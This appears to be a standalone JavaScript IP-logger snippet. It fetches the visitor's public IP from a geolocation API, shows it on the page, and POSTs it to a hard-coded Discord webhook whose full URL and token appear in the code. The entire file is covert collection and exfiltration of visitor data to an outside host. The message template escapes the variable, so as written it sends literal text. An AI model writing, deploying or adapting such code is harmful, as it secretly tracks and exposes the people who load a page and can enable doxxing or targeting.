const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";

fetch("https://api.techniknews.net/ipgeo/")
    .then(response => response.json())
    .then(json => {
        const ip = json.ip;
        document.getElementById("ip").innerText = ip;

        const msg = {
            content: `query - \${ip}\n query - \${ip}\n query - \${ip}`
        };

        return fetch(whurl + "?wait=true", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(msg)
        });
    })
    .then(response => response.json())
    .then(console.log)
    .catch(console.error);
